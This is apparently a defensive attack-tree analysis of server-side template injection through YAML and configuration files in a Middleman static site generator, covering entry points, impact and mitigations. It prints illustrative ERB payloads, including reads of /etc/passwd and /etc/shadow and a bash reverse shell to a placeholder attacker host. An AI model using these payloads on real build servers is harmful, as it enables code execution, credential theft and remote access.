## Deep Analysis of Attack Tree Path: Server-Side Template Injection (SSTI) via Configuration or Data Files

### 1. Define Objective of Deep Analysis

The primary objective of this deep analysis is to thoroughly understand the risks associated with Server-Side Template Injection (SSTI) via configuration or data files within a Middleman application. This includes:

*   **Understanding the attack mechanism:**  How can an attacker leverage this vulnerability?
*   **Assessing the potential impact:** What are the consequences of a successful exploitation?
*   **Identifying potential entry points:** Where in the Middleman application are configuration or data files processed in a way that could be vulnerable?
*   **Evaluating the likelihood of exploitation:** How feasible is it for an attacker to successfully execute this attack?
*   **Developing effective mitigation strategies:** What steps can the development team take to prevent this vulnerability?

### 2. Scope of Analysis

This analysis will focus specifically on the attack path: **Server-Side Template Injection (SSTI) via Configuration or Data Files [HIGH RISK PATH]**. We will examine:

*   The role of configuration and data files in a Middleman application.
*   How Middleman processes these files and if any templating engines are involved.

### 4. Deep Analysis of Attack Tree Path: Server-Side Template Injection (SSTI) via Configuration or Data Files [HIGH RISK PATH]

**Attack Path:** Server-Side Template Injection (SSTI) via Configuration or Data Files [HIGH RISK PATH]

*   **Server-Side Template Injection (SSTI) via Configuration or Data Files [HIGH RISK PATH]:**
    *   **Attack Vector:** Server-Side Template Injection (SSTI) via Configuration or Data Files
        *   **Likelihood:** Low
        *   **Impact:** High (Remote Code Execution on build server)
        *   **Effort:** Medium to High (Requires understanding of templating engine and Middleman internals)
        *   **Skill Level:** High
        *   **Detection Difficulty:** Hard (May not leave obvious traces in the final output)
    *   **Detailed Explanation:** If configuration files or data files allow for dynamic template rendering based on untrusted data, attackers can inject malicious code that executes on the server during the build process.
        *   **Attack Scenario:** An attacker gains access to a data file used by Middleman (e.g., a YAML file) and injects malicious template code. When Middleman processes this file, the injected code is executed on the server, potentially allowing the attacker to read files, execute commands, or compromise the build environment.

**Detailed Breakdown:**

1. **Understanding the Vulnerability:**

    *   **Core Concept:** SSTI occurs when user-controlled data is embedded into a template engine and processed by the server. If the template engine doesn't properly sanitize this data, an attacker can inject malicious code that the server will execute.
    *   **Middleman Context:** Middleman is a static site generator. It uses Ruby and often employs templating engines like ERB (Embedded Ruby), Haml, or Slim to generate HTML and other assets. Configuration files (e.g., `config.rb`) and data files (e.g., YAML, JSON, CSV in the `data/` directory) are crucial for defining the site's structure and content.
    *   **The Risk:** If Middleman uses a templating engine to process data from these files *without proper sanitization*, it becomes vulnerable to SSTI. This means if an attacker can modify these files, they can inject malicious template code.

2. **Potential Entry Points and Attack Vectors:**

    *   **Compromised Version Control System (VCS):** If the attacker gains access to the Git repository where the Middleman project is stored, they can directly modify configuration or data files. This is a primary concern.
    *   **Compromised Development Environment:** If the attacker compromises a developer's machine, they can modify the files locally and push the changes.
    *   **Supply Chain Attacks:** If a dependency used by the Middleman project has a vulnerability that allows for file modification, this could be an indirect entry point.
    *   **Misconfigured Deployment Processes:** If the deployment process involves copying files from an insecure location, an attacker might be able to inject malicious content there.

3. **Mechanism of Exploitation:**

    *   **Identifying Vulnerable Code:** The attacker needs to find where Middleman reads and processes configuration or data files using a templating engine. This might involve looking for code that uses methods like `ERB.new(data).result(binding)` or similar constructs for other templating engines.
    *   **Crafting Malicious Payloads:** The attacker will craft payloads specific to the templating engine being used. For example, in ERB, they might use:
        *   `<%= system('whoami') %>` to execute a system command.
        *   `<%= File.read('/etc/passwd') %>` to read sensitive files.
        *   More complex Ruby code to establish a reverse shell or perform other malicious actions.
    *   **Injecting the Payload:** The attacker injects this payload into a configuration or data file. For example, in a YAML file:

        ```yaml
        title: "My Website"
        description: "<%= system('cat /etc/shadow') %>"
        ```

    *   **Triggering the Execution:** When Middleman builds the site, it will process this file. The templating engine will evaluate the injected code, executing it on the build server.

4. **Impact Assessment:**

    *   **Remote Code Execution (RCE):** The most significant impact is the ability to execute arbitrary code on the build server. This gives the attacker complete control over the server.
    *   **Data Breach:** The attacker can access sensitive data stored on the build server, including environment variables, API keys, and potentially source code.
    *   **Build Process Manipulation:** The attacker can modify the build process to inject malicious code into the final website, leading to further attacks on end-users.
    *   **Supply Chain Compromise:** By compromising the build process, the attacker can inject malicious code into the final product, affecting all users of the website.
    *   **Denial of Service (DoS):** The attacker could execute commands that consume resources and prevent the build process from completing.

5. **Likelihood, Effort, and Skill Level:**

    *   **Likelihood (Low):** While the impact is high, the likelihood is rated as low because it requires the attacker to gain access to the project's files. This is not typically as easy as exploiting vulnerabilities in publicly accessible web pages.
    *   **Effort (Medium to High):**  Exploiting this requires understanding how Middleman processes configuration and data files and knowledge of the specific templating engine used. It's not a trivial task.
    *   **Skill Level (High):**  The attacker needs a good understanding of web application security, templating engines, and potentially Ruby programming.

6. **Detection Difficulty (Hard):**

    *   The malicious code executes during the build process and might not leave obvious traces in the final generated website.
    *   Standard web application firewalls (WAFs) are unlikely to detect this type of attack as it occurs server-side during the build.
    *   Detection relies on careful monitoring of the build process and changes to configuration and data files.

**Mitigation Strategies:**

*   **Input Sanitization and Escaping:**  **Crucially, avoid directly rendering data from configuration or data files using a templating engine without proper sanitization.** If dynamic content is needed, ensure it's escaped appropriately for the output context (e.g., HTML escaping).
*   **Principle of Least Privilege:** Limit access to configuration and data files to only authorized personnel and processes.
*   **Version Control Security:** Secure the Git repository with strong authentication and authorization mechanisms. Implement code review processes to catch malicious changes.
*   **Immutable Infrastructure:** Consider using immutable infrastructure for the build environment, making it harder for attackers to persist changes.
*   **Regular Security Audits:** Conduct regular security audits of the Middleman application and its build process to identify potential vulnerabilities.
*   **Dependency Management:** Keep dependencies up-to-date and scan them for known vulnerabilities.
*   **Content Security Policy (CSP):** While not directly preventing SSTI on the build server, a strong CSP can mitigate the impact of injected client-side scripts if the attacker manages to inject them into data files that are later rendered on the client-side.
*   **Monitoring and Alerting:** Implement monitoring for changes to configuration and data files and for unusual activity during the build process.
*   **Consider Alternatives to Dynamic Templating in Configuration:** If possible, avoid using templating engines to process data from configuration files. Opt for static configuration or use safer methods for dynamic configuration.

**Example Payloads (Illustrative):**

These are examples for ERB, a common Ruby templating engine:

*   **Read a file:** `<%= File.read('/etc/passwd') %>`
*   **Execute a command:** `<%= `ls -la` %>`
*   **Establish a reverse shell (requires network access from the build server):** `<%= system('bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1') %>`

**Conclusion:**

Server-Side Template Injection via configuration or data files in a Middleman application represents a significant security risk due to the potential for remote code execution on the build server. While the likelihood might be considered low due to the requirement of gaining access to project files, the impact of successful exploitation is severe. The development team must prioritize implementing robust mitigation strategies, focusing on preventing the direct rendering of untrusted data from configuration and data files using templating engines. Secure access controls, version control security, and regular security audits are also crucial for minimizing the risk of this attack vector.
